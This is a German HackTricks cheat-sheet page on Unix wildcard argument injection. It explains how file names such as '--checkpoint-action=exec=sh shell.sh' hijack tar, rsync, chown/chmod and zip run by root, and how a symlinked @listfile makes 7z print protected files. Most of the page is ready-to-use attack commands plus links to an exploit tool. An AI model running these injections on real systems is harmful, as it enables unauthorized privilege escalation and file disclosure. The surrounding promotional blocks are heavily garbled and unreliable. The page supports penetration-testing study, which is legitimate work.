{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Lernen & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Überprüfen Sie das [**subsrippangithub.cm/sorsarlosp!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Teilen Sie Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


## chown, chmod

Sie können **angeben, welchen Dateibesitzer und welche Berechtigungen Sie für den Rest der Dateien kopieren möchten**.
```bash
touch "--reference=/my/own/path/filename"
```
You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(kombinierter Angriff)_\
More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Führen Sie beliebige Befehle aus:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Du kannst dies mit [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar-Angriff)_ ausnutzen.\
Mehr Informationen unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Führe beliebige Befehle aus:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Sie können dies ausnutzen, indem Sie [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _Angriff)_\
Weitere Informationen finden Sie unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

In **7z** können Sie selbst mit `--` vor `*` (beachten Sie, dass `--` bedeutet, dass die folgenden Eingaben nicht als Parameter behandelt werden können, sondern in diesem Fall nur als Dateipfade) einen beliebigen Fehler verursachen, um eine Datei zu lesen. Wenn also ein Befehl wie der folgende von root ausgeführt wird:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Und Sie können Dateien in dem Ordner erstellen, in dem dies ausgeführt wird. Sie könnten die Datei `@root.txt` und die Datei `root.txt` erstellen, die ein **symlink** zu der Datei ist, die Sie lesen möchten:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Dann wird **7z**, wenn es ausgeführt wird, `root.txt` als eine Datei behandeln, die die Liste der Dateien enthält, die es komprimieren soll (das zeigt die Existenz von `@root.txt` an), und wenn 7z `root.txt` liest, wird es `/file/you/want/to/read` lesen und **da der Inhalt dieser Datei keine Liste von Dateien ist, wird es einen Fehler ausgeben**, der den Inhalt zeigt.

_Mehr Informationen in den Write-ups der Box CTF von HackTheBox._

## Zip

**Führe beliebige Befehle aus:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{% hnt stye="acceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Lerne & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Überprüfen Sie die [**Abonnements**](https://github.com/sponsors/carlospolop)!
* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Tritt 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
